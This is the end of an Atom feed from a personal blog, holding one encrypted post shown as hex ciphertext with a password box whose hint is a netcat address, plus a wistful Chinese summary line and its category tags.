01a438246c0aaf8d8e5ec1755e0b65b358698b00bb372c62169c287d4285881fcac28755d44523075a227e06532d9fe5533681fbd3aeec20868d0f33dac375831e61fd46ddb3bb87b9206f640bd12cfa7daa6f0358ef2138614e0530f56aad9dc5826fe6860f00dd20b118fcc53b129349b3983e48593bceadbd1a945fdbecc0beb841b08b525364a28a63505d15c67d73612ef1df6de6d0d3fa86f3d8d62f1863cf907857161f0d590180386b7d0e118ac2747410958fdbc39724f06dfb2d6fa5e4c83fe20595284b11c349142080918e03b6a0f537db3b4fc058fa43487b3e9311238213d9e029bfcea983f7dee6f0fbebe688d2ebd44b1f9493faee578b22a0468eda5b28ce2bffe111140a2ea49391d35311ee6329112422d9450a37fbb9a32c47a072310dbbd949b0f994bfe1a1d119cec68f775c3de4fa60153cc82345660987adf442ea5ba69a0ffb47a0172746329df40d1c40ff1735fded355633aad6b9b005e9500d7f9534543a2d63b9910142e2d6a2e0c35183a6f9f32d5289d58ffe2b04c298eafc49b873c14ecf343923764235cc1f04a3211858fa6cc81fd0e084ce9c6f207ec1194696002f746993e40acbc18b796a2e31d1778adbe2a2e8772a3a2c1ab201d9eb430c2c7efa049048584939dbb621d16066478fd663913b64f030d6d5a110f82a715c3df4c6be7b3f77b5214091af4f6fcb6b072d9451f2d11f6b6c0deaebcfaf26f93756f6766208740ad4d14d843a0a6297776688da59a63dbc70d3ceef57f29bfba9de972a043acdd35a5f6a389818c74d39fc7e232fcbdbaaa36416607c1dc42b54b0cbeff1819c8ff4cca0ab7a74cc0f7df29ead9e3dbfc680b9898e5e8dd67ae59f827522a02f9f5e5689f20ac296bcd653d620cf0b38e240e688e1af4a657afcbf798d607365fe629280016c91fe18fe0d0d19809262467c98957e5d5430f2b6907051fa3893faff6b559ca58ffa6becd3b5854b76ad466f307d508876aab962f200ad310c47bf64bbf560593e19ae37f4344cd924bbdc57060430b3ba212fe2346310f73c9d715d05caea938eaafb36d3de13119bf268fd2576374ba87bf7692ab60d18174ae0c2812aa12760bf97b0ffa0cac8dc4133420c9f268824203740ef186ef0534f11f26ccb03fbee04c146eb561c34f042b44277b3a2abc7f6ea05c9ee3ca1a21205511594ca1c30b8e5daf0019298557fb93ffa5cb7556ab724cd3d0f7319a1121c4b6e5b3b5ce29691a6e7fdc5b231f83ce8405d83e6c0ddce798b44a9de306499ea7b8b5e9a89d090bc1782935df0bf213cb167f18c7fd4b737180ff12025c0130765d1500454eb6a97acfb37b7f60872cd0266bf867647016c1f4a96343722eafe95c0b441814a258f43aa4f9080b78a7abca09f775ac93f75dbba13cf5dcdfee2adbb750a6e967f3a272059a3761b096b72368adbe28b78047367887cced075ede3774141f148349cda833a614d0cd3f82472b164326a3970dcc9cef7527e3a296c7304ea2cee6e748ede77b29a648005faf0ab19ab82cf1112d639fef067e860a5035565515e3c44d9c03c0b462692819ae6d8eafc8adf7a1f4fe17833cc7dd714edf6006b61487d918a0c3857a7d0f1669b1e131c06c4afc81f2e10ffac483376ec983bb50b2ca3d7d07f19399a4ed15be1aae87fdbf595733a9484b8d2c6d0c836607a4069d4748d94a9d798cef34c8014bb5d30b2e8ca68440e1c277d46eb151164adfdc37609f2612db9ed210460b1e21947015b287d2c28d73198e511bac2c62c11bed078d919769247b9994806f4081bc21323a23822bf7d393530a7e6ba8fe5e675f99f8263c893b99d88949b5641cdd76bf46d5b6feeeb9259e3b86b0b6d041cf79fbb03d31e4255ac6bad4b1d5833841f9b96a74ec5d2d8ab74be97574a8b53c77de74f0f3e9df9ad2a6d28a88a2ec85977348bc09b851e022a1f21d9c7caf4ad3df1ed799430baeecbc40f69624d8297102782cc88aefd0bbf2cc5dcfa54d06e32edb8c827c615b7e5c19f529671bca34b39b71c885a3e2821c3c0ac0dd0e35b710fddc064c1f0144662846637bef44d873f3979c0b8df9cc23b4390e01fbcf4400138a2a2299e7240d9ec47c00121663e9f165a726d15e93eadb9abb7367198d505502b0c10305b284b8080973b84c2816f8b803c1e5e79f81ab47826f722a74a9b3ccd729f10c372f707a6e7bd268b5bf0fb9f6cda92fdc38bd176865f4d915c3025431d16e817a3b5020cafec2ffc9bfed813ee8494f5ecc5b4c3499e7829e3196a3409f02c17efbe9c92568d9fa6f765fcd8f750a00dedb4e74fc50939c88e83b51849a4fbeb16259af77a4a94d66e71a3f0ee1a18c9914c8b61ce4afb078bcecb69b708fb10eebe9d5e750caf6a8a9d20334ca048325d10ee33c5d6a598d16f8e8aaf819a6b078b7d51e123066398b34779cad904616b1d9f0ea1b404d029d73f72f2b3d06484cba4929ee255c0cd3f3b5f2dc583e6ba5db3b664359d92cf261d4fcfbe8dc77bd8354e10adefc127645772cf4b29de39c14ca07d8a8d8efbbc428e29acaa5cc67bcfc9409673911ac5b424946429dab68767497c752fbca0fc71dc96f39ce4720436dd4f4ec1c4fcdcdc67af5f65fb09f009e84f16c1b9432f70b89d6f9be97b7f11aae75a561774d16c5f8ea134d5c2dca713eee487be1fec2d699cfcbcc00548c0e5e0e7125d3b68b8b0fce0065fc5da5b3bdd3b270c585b53cf85e1545b9d615b5ecc5df9603e24fe176f5420a9aa97401ed84e2bb49b5aa7dc53be93b33f64ea061e8c19736aad1cce3b30fb6134f6742830cb11fa7227805608deaeec4780b7d173fa0315eebb4e591f4fa6050e8f3284a27259f603116eede20bf5645c4cb8bd2534feee41092620d3814f5931fb81f61f976e9a1fed2812fc584929f05d2bef78971042f239bd247c085718ac51ad4b47fa2ab61bcf99bb46ad82212f045621ca5b233be7769338faa0dd4741efe248f812457d48e5e09ff3fe38deb7c4a357ded0b6ee43d76dd75b1e30824d9084bde27e36bb38ac86cb14c5acc65f5772dc5adf53ed9d7e9d39081ac38b5df7b3fa0e5e7e57fb050d6485cfe3192fcccb4c95986d9000afce682b08129fd7521de0f93da402715c62510699b56729fbeb0df780a571da81af8819c5af65c6c71eb9d5560e8548482a72ac92de893d21e30b359817db93a8adca6972ebe0820b70dab35c0d79a1916def0ebc3ac240af94251f968b56d2da57bcd075915464cd59db50c68b8071e5e28757c427e2f7d80e8e5a7d4d34c5a131d035a49e9e9443cc2322e152f432f371f3ecc2ba1640790918fccaba6f39bffc392b4ac9602e93b50947ca0ae448c98f06d35d953b970c7990cfe71ad4efd16a62ba775a54390272f5e4a31550b78c4f194c221cba150137f59c09dac08472205619d4e87d1b84b28843f93b04d9fd6d261ba6c6c4b3176caa4b7fd56550afcef4e8154ab50543ccdf6e0a572e6ac0bfff676d50ec182a9db60995b4b59962ac52798b390ec14e34e7243bc216fd04fc780f6015d1cdc35ddc12e6eff3ec159f5259d47f8538c669f27320245450b5510a82bf5f96c2f01074ce2252e777e90679b0102d3faa1d1081dc40a7163ee61a5484d08a59b4223665cff516b2f2ca7feadf6546586c7f81be45f9daa6217f7631813e396e3cc</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">nc sec.arttnba3.cn 25000</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">若有一天我会离开  这座城是否还在</summary>
    
    
    
    <category term="PIECES" scheme="http://blog.arttnba3.cn/categories/PIECES/"/>
    
    
    <category term="碎碎念" scheme="http://blog.arttnba3.cn/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
  </entry>
  
</feed>
